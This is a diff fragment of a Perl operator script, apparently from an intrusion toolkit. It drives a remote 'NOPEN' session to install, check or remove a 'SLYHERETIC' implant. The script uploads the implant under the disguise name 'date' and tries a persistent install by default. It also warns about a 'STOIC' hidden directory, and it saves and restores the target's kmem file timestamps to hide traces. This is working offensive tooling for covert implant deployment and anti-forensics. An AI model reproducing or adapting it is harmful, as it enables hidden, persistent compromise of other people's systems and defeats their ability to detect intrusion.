+		`cd $opdown ; ls -al ../down/Slycheck.$nopen_rhostname.results$which | sed "s,.* root ,  ,g"`.
+		$matches.
+		"\n\nUseful searches in that popup include these (triple click them):\n\n".
+		"/[\.:][0-9][0-9]  [^ ].*\n".
+		"/'.*'\n".
+	"") unless ($foundrunning or $foundinstalled);
+    }
+    return($foundrunning,$foundinstalled);
+}
+#checkpersist
+
+sub myinit {
+  $willautoport=1;
+  my $autoutils = "../etc/autoutils" ;
+  unless (-e $autoutils) {
+    $autoutils = "/current/etc/autoutils" ;
+   }
+  require $autoutils;
+
+
+  ($installtype) = $0 =~ /auto(\S+)/;
+
+  $prog = "-gs $installtype";
+  $vertext = "$prog version $VER\n" ;
+  mydie("No user servicable parts inside.\n".
+	"(I.e., noclient calls $prog, not you.)\n".
+	"$vertext") unless ($nopen_rhostname and $nopen_mylog and
+			    -e $nopen_mylog);
+
+  $usagetext="
+Usage: $prog [-h]                       (prints this usage statement)
+
+NOT CALLED DIRECTLY
+
+$prog is run from within a NOPEN session when \"$prog\" or
+\"=install\" is used.
+
+";
+  {  $gsusagetext=<<EOFUSAGE ;
+Usage: $prog [options] [tarball] 
+
+$prog handles SLYHERETIC installs, checks and uninstalls, logging each
+and its success or failure in $opetc/hostinfo.HOSTNAME.IPADDRESS
+and in $opdown/UsedTools.HOSTNAME.IPADDRESS/.
+
+
+OPTIONS
+  -h/-v      Show usage/version
+  -b         Pause after uploading installer (date) and Ctrl (e.g.,
+             to bless them in another window)
+  -C         Only check SLYHERETIC persistence/injection (tarball is optional)
+             Results are shown in the NOPEN window, popped up, and saved in both
+             down/ and down/UsedTools.HOST.IP.
+             This is also done before and after any install or uninstall.
+  -F         Do NOT attempt a persistent install (default does)
+  -L         Log last install as successful
+  -l         Log last install as a failure
+  -p         Preface the \"date\" command with something--you are prompted right
+             before it is executed for that string. You can run another command
+             or set a variable. You must ensure it is proper syntax, including
+             any semicolons. E.g., you could enter any of:
+                         ulimit -n 1024;
+                         ulimit -n 1024 &&
+                         TZ=GMT
+			 export TZ=GMT ; 
+                         SOMEVAR=\"Some content\"
+  -r NAME    Upload/execute as \"name\" instead of the default.
+             The -r defaults to \"date\" for both install and uninstall.
+  -T         Log successful install from tarball contents
+  -t         Log unsuccessful install from tarball contents
+  -U         DEINSTALL existing SLYHERETIC implant (tarball is optional with -U)
+  -u FILE    Uninstall binary to use, be sure it is the right version
+  -V VER     Use this version of SLY binaries for checking with -C (they must be
+             present in $opup/slyheretic_checks/)
+  -w DIR     Use this as your working directory
+
+      NOTE:  Use -l or -L if the PATH=. date line hangs and you have to
+             kill that NOPEN window (and $prog) to get it back
+
+Usage: $prog [options] [tarball] 
+
+EOFUSAGE
+   }
+
+  $tarball=pop @ARGV if (-f $ARGV[$#ARGV]);
+  mydie("bad option(s), try without a space after the -s") if (! Getopts( "hvbCFLlPpr:TtUu:V:w:"));
+    #STOIC WAS: hvdUS:Llr:w:TtbCPs:Bp" ) ) ;
+  # Unknown why but "-UC TARBALL" leads to empty @ARGV so used pop above to get it
+  if ($opt_V) {
+    $opt_V =~ s,^v+,,i ;
+    mydie("Invalid -V option, must be a version number")
+	unless ($opt_V =~ /^((\d+\.*){1,8})$/);
+    $slyveropt = $opt_V;
+  }
+  $donotpersist = $opt_F;
+  $tarball=shift @ARGV if (-f $ARGV[0]);
+  $deinstallonly = $opt_U;
+  if ($opt_u) {
+    $deinstallbinary = $opt_u;
+    mydie("-u $opt_u is not a file") unless (-f $deinstallbinary);
+  }
+  $checkpersistonly = $opt_C;
+  $extracmd = $opt_p;
+  $dopause = defined $opt_b ? "-b" : "" ; # b for bless
+  $remotename = $opt_r;
+  $workdir = "/tmp";
+  $workdir = $opt_w if length $opt_w;
+  
+  $debug = $opt_d ;
+  $logsuccess = $opt_L;
+  $logfailure = $opt_l;
+  $logsuccessball = $opt_T;
+  $logfailureball = $opt_t;
+  $tmpfilext = "$$";
+  usage() if ($opt_h or $opt_v) ;
+
+  mydie("-r $remotename cannot contain any /")
+    if ($remotename =~ m,/,);
+  mydie("-w $workdir must begin with a /")
+    unless $workdir =~ m,^/,;
+  mydie("-w $workdir cannot contain whitespace")
+    if $workdir =~ m,\s,;
+  $workdiropt = "w$workdir" if $workdir;
+
+  offerabort("Should be doing this? You have a STOIC hidden directory, why are we\n".
+		"doing a SLYHERETIC install?")
+    if ($host_hiddendir);
+
+  if ($host_workingdir and $host_workingdir ne $workdir) {
+    progprint("RESETTING host-wide variable host_workingdir from:\n".
+	      "  $host_workingdir to $workdir",
+	      $COLOR_FAILURE);
+  }
+
+  # The unless $socket should never be needed here, this is a standalone script.
+  $socket = pilotstart(quiet) unless $socket;
+
+  unless (-f "$opdown/cmdout/$nopen_rhostname-find") {
+    my (undef,undef,@output) = doit("=df");
+    for (my $i=0;$i<@output;$i++) {
+	next if (!$output[$i] or $output[$i] =~ /^\S.*\%/);
+	if ($output[$i] =~ /^\S/ and $output[$i+1] =~ /^\s.*\%/) {
+	    $output[$i] .= " $output[$i+1]";
+	    $output[$i+1] = "";
+	}
+    }
+    #my @bins = grep m,(\/sbin|\/bin), , @output;
+    @output = grep /\S+/ , @output;
+    my $morepartitions = "";
+    foreach my $line (@output) {
+	next if $line =~ m,^\S+:, ;
+	my @fields = split(/\s+/,$line);
+	next unless $fields[-1] =~ m,^/,;
+#offerabort("line=$line= fields=(\n".join("=\n",@fields)."=\n)\n");
+	$morepartitions .= " $fields[-1]";
+    }
+    offerabort(	"You do not have a -find done on this target yet. This is used to determine\n".
+		"the size of any implanted file from before the install.  You should consider\n".
+		"doing a full -find first:\n\n".
+		"       -find$morepartitions\n\n","ABORT");
+  }
+
+  # Proceed with tarball install
+  mydie("You cannot use -l or -L with a tarball")
+    if ($tarball and ($logsuccess or $logfailure));
+  mydie("You must use -t or -T with a tarball")
+    if (!$tarball and ($logsuccessball or $logfailureball));
+  $logonly = ($logsuccess or $logfailure or $logsuccessball or $logfailureball);
+
+} #myinit
+
+
+sub myfiletimesave {
+  # Use -ls -n to save m/atimes of a this hosts kmem file (just once per op tho,
+  # use previous result from global $host_touchkmem).
+  # Unable to use the filetimesave() in utils, @ is messy.
+  # That can be used later from the global $host_touchkmem to set
+  # the times back.
+  # NOTE: TO save times for a file containing an @ symbol, use ? instead,
+  #       EVEN when calling filetimesave().
+  # RETURNS: array of touch lines for files just sent.
+  return () unless ($socket);
+  local($savetimefile) = (@_);
+  my ($result,@results) = ();
+  unless ($host_touchkmem) {
+    ($result) = doit("-ls -n $savetimefile");
+    chomp($result);
+    my ($mtime,$atime) = $result =~ /-touch -t (\d+):(\d+)\s+$savetimefile/;
+    next unless ($mtime and $atime);
+    $result =~ s,\@,\\@,g;
+    newhostvar("host_touchkmem","-touch -t $mtime:$atime");
+  }
+  push(@results,$host_touchkmem)
+    if ($host_touchkmem);
+  return @results;
+}
